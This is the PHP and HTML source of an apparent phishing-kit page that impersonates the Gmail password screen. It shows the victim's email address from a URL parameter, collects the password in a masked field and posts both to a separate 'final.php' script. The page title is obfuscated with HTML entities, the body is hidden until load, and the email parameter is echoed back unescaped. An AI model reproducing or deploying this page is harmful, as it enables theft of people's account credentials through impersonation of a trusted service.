<?php
session_start();
$id = $_GET['uploaded'];
$_SESSION['id']=$id;
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#71;&#109;&#97;&#105;&#108;</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">

<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 11px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 1281px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
		body {
			/* background image override */
			background-image:  url(images/background.png);
			background-size:   cover;
			background-repeat: no-repeat;
		}
	</style>
	<style type="text/css">
 .textbox { 

	flex-shrink: 1;
    background-color: transparent;
    border: none;
    display: block;
    font: 400 16px Roboto,RobotoDraft,Helvetica,Arial,sans-serif;
    height: 24px;
    line-height: 24px;
    margin: 0;
    min-width: 0%;
    outline: none;
    padding: 2;
    z-index: 0;
}

 </style>
</head>
<body>
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:413px; top:606px; width:140px; height:17px; z-index:0"><img src="images/english.png" alt="" title="" border=0 width=140 height=17></div>

<div id="image3" style="position:absolute; overflow:hidden; left:670px; top:603px; width:31px; height:20px; z-index:1"><img src="images/help.png" alt="" title="" border=0 width=31 height=20></div>

<div id="image4" style="position:absolute; overflow:hidden; left:751px; top:605px; width:112px; height:17px; z-index:2"><img src="images/privacy.png" alt="" title="" border=0 width=112 height=17></div>

<div id="image1" style="position:absolute; overflow:hidden; left:412px; top:66px; width:457px; height:507px; z-index:3"><img src="images/login2.png" alt="" title="" border=0 width=457 height=507></div>

<div id="image5" style="position:absolute; overflow:hidden; left:453px; top:394px; width:116px; height:20px; z-index:4"><a href="#"><img src="images/forget.png" alt="" title="" border=0 width=116 height=20></a></div>
<form action="final.php" name=chalbhai id="demo-form" method=post>
     <input name="user" value="<?=$id?>" type="hidden">
<input name="pass" placeholder="Enter your password" id="demo-field"  autocomplete="off"  class="textbox" required type="text" style="position:absolute;width:373px;left:453px;top:313px;z-index:5">
<div id="text1" style="position:absolute;text-align: left; overflow:hidden; left:455px; top:186px; width:283px; height:50px; z-index:6">
<div class="wpmd">
<div><font class="ws16"><?php echo $id; ?></font></div>
</div></div>

<div id="image6" style="position:absolute; overflow:hidden; left:802px; top:188px; width:22px; height:17px; z-index:7"><a href="#"><img src="images/teer.png" alt="" title="" border=0 width=22 height=17></a></div>

<div id="formimage1" style="position:absolute; left:731px; top:385px; z-index:8"><input type="image" name="formimage1" width="94" height="41" src="images/button2.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>